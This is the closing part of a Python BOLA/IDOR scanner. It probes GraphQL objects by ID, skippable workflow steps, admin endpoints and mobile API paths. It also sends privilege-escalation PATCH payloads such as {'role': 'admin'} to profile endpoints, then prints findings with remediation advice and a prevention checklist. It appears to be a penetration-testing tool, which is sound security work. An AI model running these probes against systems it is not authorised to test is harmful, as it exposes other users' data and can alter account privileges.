            ("profile",      '{ profile(id: ID) { id bio phone email } }'),
            ("document",     '{ document(id: ID) { id title content author { id } } }'),
            ("payment",      '{ payment(id: ID) { id amount status cardLast4 } }'),
            ("message",      '{ message(id: ID) { id body sender { id email } } }'),
            ("file",         '{ file(id: ID) { id name url owner { id } } }'),
            ("subscription", '{ subscription(id: ID) { id plan status } }'),
        ]

        for obj_name, query_tpl in object_queries:
            base_q  = query_tpl.replace("ID", "1")
            s1, b1, _ = await fetch(session, gql_url, token, "POST", {"query": base_q})
            if s1 != 200 or '"data"' not in b1:
                continue
            try:
                d1 = json.loads(b1).get("data", {}).get(obj_name)
            except: d1 = None

            if d1 is None: continue  # object not returned

            # Try ID=2
            alt_q   = query_tpl.replace("ID", "2")
            s2, b2, _ = await fetch(session, gql_url, token, "POST", {"query": alt_q})
            try:
                d2 = json.loads(b2).get("data", {}).get(obj_name)
            except: d2 = None

            if d2 and d1 != d2:
                findings.append(BOLAFinding(
                    module="09-GraphQL",
                    name=f"BOLA: GraphQL '{obj_name}' Object Accessible by ID",
                    severity="HIGH",
                    description=(
                        f"GraphQL query '{obj_name}(id: ...)' returned data for both "
                        f"id=1 and id=2. No ownership validation detected."
                    ),
                    endpoint=gql_url, method="POST",
                    evidence=(
                        f"Query: {base_q[:60]} → HTTP {s1} | "
                        f"Alt query (id=2): HTTP {s2} | "
                        f"Different {obj_name} objects returned"
                    ),
                    original_id="1", tested_id="2",
                    recommendation=(
                        f"In the GraphQL resolver for '{obj_name}', verify context.user "
                        f"owns the requested object. Return null or an error if not."
                    ),
                ))

# ══════════════════════════════════════════════════════════
#  MODULE 10 — Multi-Step Workflow Testing
# ══════════════════════════════════════════════════════════

async def module_10_workflow(session, base_url, token, token2,
                              endpoints, findings):
    """Skip steps or change object IDs in multi-step workflows."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    async def test_workflow(steps):
        # Try accessing later steps directly without completing earlier ones
        for i, step in enumerate(steps):
            if i == 0: continue  # skip first step (entry point)
            url = make_url(origin, step, "1")
            s, b, _ = await fetch(session, url, token,
                                   method="POST" if "{id}" not in step else "GET",
                                   data={"step": i+1, "data": "test"})
            if s in (200, 201) and len(b) > 10:
                findings.append(BOLAFinding(
                    module="10-Workflow",
                    name="BOLA: Multi-Step Workflow Step Skippable",
                    severity="HIGH",
                    description=(
                        f"Step {i+1} of workflow '{steps[0]}→...→{steps[-1]}' "
                        f"is directly accessible without completing prior steps. "
                        f"Object IDs from later steps may also be tampered."
                    ),
                    endpoint=url, method="GET/POST",
                    evidence=f"Direct access to step {i+1}: {url} → HTTP {s} ({len(b)}B)",
                    original_id="(step order)", tested_id=f"step {i+1} direct",
                    recommendation=(
                        "Enforce step-by-step state server-side using session tokens. "
                        "Validate object ownership at every workflow step."
                    ),
                ))

    await asyncio.gather(*[test_workflow(steps) for steps in WORKFLOW_STEPS])

# ══════════════════════════════════════════════════════════
#  MODULE 11 — Role-Based Access Testing
# ══════════════════════════════════════════════════════════

async def module_11_role_based(session, base_url, token, token2,
                                endpoints, findings):
    """Test if a normal user can access admin/privileged objects."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    for path_tpl in ADMIN_PATHS:
        url = make_url(origin, path_tpl, "1")
        s, b, _ = await fetch(session, url, token)
        if s == 200 and len(b) > 20:
            is_json = b.strip().startswith("{") or b.strip().startswith("[")
            findings.append(BOLAFinding(
                module="11-Role-Based",
                name="BOLA: Normal User Can Access Admin/Privileged Endpoint",
                severity="CRITICAL",
                description=(
                    f"Admin endpoint '{path_tpl}' returned HTTP 200 "
                    f"with a normal user token. Privileged data may be exposed."
                ),
                endpoint=url, method="GET",
                evidence=(
                    f"URL: {url} → HTTP {s} ({len(b)}B) | "
                    f"{'JSON response' if is_json else 'HTML/text response'}"
                ),
                original_id="(admin)", tested_id="(user token)",
                recommendation=(
                    "Implement role-based access control (RBAC). "
                    "Check the user's role from the auth token on every admin endpoint. "
                    "Return HTTP 403 for insufficient privileges."
                ),
            ))

    # Test privilege escalation via role parameter
    role_tamper_paths = [
        f"{origin}/api/v1/users/me",
        f"{origin}/api/users/me",
        f"{origin}/api/v1/profile",
        f"{origin}/api/profile",
    ]
    for url in role_tamper_paths:
        for payload in [{"role": "admin"}, {"is_admin": True}, {"admin": True},
                         {"role": "superuser"}, {"permissions": ["admin"]}]:
            s, b, _ = await fetch(session, url, token, method="PATCH", data=payload)
            if s in (200, 201):
                findings.append(BOLAFinding(
                    module="11-Role-Based",
                    name="BOLA: Role/Privilege Escalation via PATCH",
                    severity="CRITICAL",
                    description=(
                        f"PATCH to '{url}' with {payload} returned HTTP {s}. "
                        f"An attacker may be able to escalate their own privileges."
                    ),
                    endpoint=url, method="PATCH",
                    evidence=f"Payload: {json.dumps(payload)} → HTTP {s} ({len(b)}B)",
                    original_id="user", tested_id="admin",
                    recommendation="Never allow users to set their own role/permission fields.",
                ))
            break

# ══════════════════════════════════════════════════════════
#  MODULE 12 — Mobile API Testing
# ══════════════════════════════════════════════════════════

async def module_12_mobile_api(session, base_url, token, token2,
                                endpoints, findings):
    """Test mobile app API endpoint patterns for BOLA."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    mobile_headers_list = [
        {"X-App-Platform": "iOS",     "X-App-Version": "2.1.0",
         "X-Device-ID":   "abc12345", "User-Agent": "MyApp/2.1.0 (iPhone; iOS 17.0)"},
        {"X-App-Platform": "Android", "X-App-Version": "2.1.0",
         "X-Device-ID":   "xyz98765", "User-Agent": "MyApp/2.1.0 (Android 14)"},
        {"User-Agent": "okhttp/4.9.0"},
        {"User-Agent": "Dart/2.19 (dart:io)"},  # Flutter
    ]

    async def probe_mobile(path_tpl, test_id, mobile_hdrs):
        url = make_url(origin, path_tpl, test_id)
        s, b, _ = await fetch(session, url, token, headers_extra=mobile_hdrs)
        if s == 200 and len(b) > 20:
            # Test adjacent ID
            for alt_id in gen_ids(test_id)[:2]:
                alt_url = make_url(origin, path_tpl, alt_id)
                as_, ab, _ = await fetch(session, alt_url, token,
                                          headers_extra=mobile_hdrs)
                if as_ == 200 and len(ab) > 20 and similarity(b, ab) < 0.9:
                    platform = mobile_hdrs.get("X-App-Platform",
                                                mobile_hdrs.get("User-Agent", "Mobile")[:20])
                    findings.append(BOLAFinding(
                        module="12-Mobile-API",
                        name=f"BOLA: Mobile API Endpoint Vulnerable ({platform})",
                        severity="HIGH",
                        description=(
                            f"Mobile API path '{path_tpl}' is accessible with "
                            f"mobile headers and exposes different objects when ID is changed."
                        ),
                        endpoint=url, method="GET",
                        evidence=(
                            f"Platform: {platform} | ID '{test_id}': HTTP {s} ({len(b)}B) | "
                            f"ID '{alt_id}': HTTP {as_} ({len(ab)}B)"
                        ),
                        original_id=test_id, tested_id=alt_id,
                        recommendation=(
                            "Mobile API endpoints must enforce the same ownership "
                            "authorization as web APIs. Never rely on the client platform "
                            "for security decisions."
                        ),
                    ))
                    return

    tasks = []
    for path_tpl in MOBILE_API_PATHS:
        for hdrs in mobile_headers_list[:2]:   # 2 mobile profiles per path
            for tid in ["1", "2", "100"]:
                tasks.append(probe_mobile(path_tpl, tid, hdrs))
    await asyncio.gather(*tasks, return_exceptions=True)

# ══════════════════════════════════════════════════════════
#  ORCHESTRATOR
# ══════════════════════════════════════════════════════════

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

async def run_scanner(target_url: str,
                      token:  Optional[str] = None,
                      token2: Optional[str] = None) -> ScanResult:

    result = ScanResult(target=target_url)
    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url
        result.target = target_url

    connector = aiohttp.TCPConnector(ssl=False, limit=40)
    timeout   = aiohttp.ClientTimeout(total=12)

    modules = [
        ("01 ID Manipulation",       module_01_id_manipulation),
        ("02 Nested Objects",         module_02_nested_objects),
        ("03 PUT/PATCH/DELETE",       module_03_write_methods),
        ("04 Parameter Tampering",    module_04_parameter_tampering),
        ("05 Mass Enumeration",       module_05_mass_enumeration),
        ("06 File/Media Objects",     module_06_file_media),
        ("07 Secondary Endpoints",    module_07_secondary_endpoints),
        ("08 UUID Testing",           module_08_uuid_testing),
        ("09 GraphQL BOLA",           module_09_graphql),
        ("10 Workflow Testing",       module_10_workflow),
        ("11 Role-Based Access",      module_11_role_based),
        ("12 Mobile API",             module_12_mobile_api),
    ]

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        start = time.perf_counter()

        print(f"\n  {DIM}[Discovery]{RESET} Crawling endpoints...")
        endpoints = await discover_endpoints(session, target_url, token)
        print(f"  {DIM}[Discovery]{RESET} {len(endpoints)} endpoints found\n")
        print(f"  {CYAN}{BOLD}Running 12 BOLA modules concurrently...{RESET}\n")

        findings: List[BOLAFinding] = []

        # Run ALL 12 modules concurrently
        async def run_module(name, fn):
            result.modules_run.append(name)
            try:
                await fn(session, target_url, token, token2, endpoints, findings)
                print(f"  {GREEN}✓{RESET} {name}")
            except Exception as e:
                result.errors.append(f"{name}: {e}")
                print(f"  ✗ {name} — {e}")

        await asyncio.gather(*[run_module(n, fn) for n, fn in modules])

        result.duration = time.perf_counter() - start
        result.endpoints_tested = len(endpoints)

        # Deduplicate
        seen: Set[tuple] = set()
        for f in findings:
            key = (f.endpoint, f.tested_id, f.name[:40])
            if key not in seen:
                seen.add(key)
                result.findings.append(f)

    result.findings.sort(key=lambda f: SEVERITY_ORDER.get(f.severity, 99))
    return result

# ══════════════════════════════════════════════════════════
#  REPORT
# ══════════════════════════════════════════════════════════

def print_report(result: ScanResult) -> None:
    line = "═" * 72
    print(f"\n{BOLD}{line}{RESET}")
    print(f"{BOLD}  BOLA / IDOR FULL SCAN REPORT  —  v2.0  (12 Modules){RESET}")
    print(f"{BOLD}{line}{RESET}")
    print(f"  Target            : {result.target}")
    print(f"  Scan Duration     : {result.duration:.2f}s")
    print(f"  Endpoints Tested  : {result.endpoints_tested}")
    print(f"  Modules Run       : {len(result.modules_run)}/12")
    print(f"  Findings          : {len(result.findings)}")
    print(f"{line}\n")

    if not result.findings:
        print(f"  {GREEN}✅  No BOLA vulnerabilities detected.{RESET}\n")
        print("  Tip: Provide --token for authenticated scanning to find more issues.\n")
    else:
        counts: Dict[str, int] = {}
        module_counts: Dict[str, int] = {}
        for f in result.findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
            module_counts[f.module] = module_counts.get(f.module, 0) + 1

        print(f"  {BOLD}Severity Summary:{RESET}")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if sev in counts:
                color = SEVERITY_COLOR[sev]
                bar   = "█" * min(counts[sev] * 3, 36)
                print(f"    {color}{sev:<10}{RESET}  {bar}  {counts[sev]}")
        print()

        print(f"  {BOLD}Findings by Module:{RESET}")
        for mod, cnt in sorted(module_counts.items()):
            print(f"    {DIM}{mod:<30}{RESET}  {cnt} finding(s)")
        print()

        for i, f in enumerate(result.findings, 1):
            color = SEVERITY_COLOR.get(f.severity, "")
            print(f"  {BOLD}[{i:02d}] {color}{f.severity}{RESET}{BOLD}  [{f.module}]  {f.name}{RESET}")
            print(f"       Endpoint    : [{f.method}] {f.endpoint}")
            print(f"       Description : {f.description}")
            if f.original_id: print(f"       Original ID : {f.original_id}")
            if f.tested_id:   print(f"       Tested ID   : {f.tested_id}")
            if f.evidence:    print(f"       Evidence    : {f.evidence}")
            if f.recommendation: print(f"       Fix         : {f.recommendation}")
            print()

    if result.errors:
        print(f"  {DIM}Scan errors:{RESET}")
        for e in result.errors: print(f"     • {e}")
        print()

    print(f"{line}")
    print(f"\n  {BOLD}BOLA Prevention Checklist:{RESET}")
    checks = [
        "Verify object ownership server-side on EVERY request (GET, POST, PUT, PATCH, DELETE)",
        "Use unpredictable UUIDs (v4) instead of sequential integer IDs",
        "Never trust IDs from URLs, query params, or request bodies — derive from auth token",
        "Apply ownership checks to ALL endpoints: primary, secondary, export, download, mobile",
        "Return HTTP 403 (Forbidden), NOT 404, when ownership check fails",
        "Implement RBAC — check user role before serving admin endpoints",
        "Validate ownership at every step of multi-step workflows",
        "Use signed/expiring URLs for file/media access (pre-signed S3 etc.)",
        "Add automated BOLA regression tests to your CI/CD pipeline",
        "Audit GraphQL resolvers — every resolver must check context.user ownership",
    ]
    for c in checks:
        print(f"  ✔  {c}")
    print()

# ══════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════

async def main():
    parser = argparse.ArgumentParser(
        description="BOLA/IDOR Scanner v2.0 — 12 Attack Modules",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python bola_scanner_v2.py http://127.0.0.1:5000
  python bola_scanner_v2.py https://api.example.com --token eyJhbGci...
  python bola_scanner_v2.py https://api.example.com --token <user1_jwt> --token2 <user2_jwt>

Notes:
  --token   : Auth token for User 1 (your account)
  --token2  : Auth token for User 2 (a second test account — enables cross-user tests)
  Without tokens the scanner runs unauthenticated (still useful for public endpoints)
        """
    )
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--token",  default=None, help="User 1 JWT / Bearer token")
    parser.add_argument("--token2", default=None, help="User 2 JWT (for cross-user BOLA tests)")
    args = parser.parse_args()

    print(f"\n  {BOLD}{'═'*60}{RESET}")
    print(f"  {BOLD}BOLA / IDOR Vulnerability Scanner  v2.0{RESET}")
    print(f"  {BOLD}12 Attack Modules  |  Async Concurrent{RESET}")
    print(f"  {BOLD}{'═'*60}{RESET}")
    print(f"  Target  : {args.url}")
    print(f"  Token 1 : {'✅ provided' if args.token  else '⚠️  none (unauthenticated)'}")
    print(f"  Token 2 : {'✅ provided' if args.token2 else '⚠️  none (no cross-user test)'}")

    result = await run_scanner(args.url, args.token, args.token2)
    print_report(result)

if __name__ == "__main__":
    asyncio.run(main())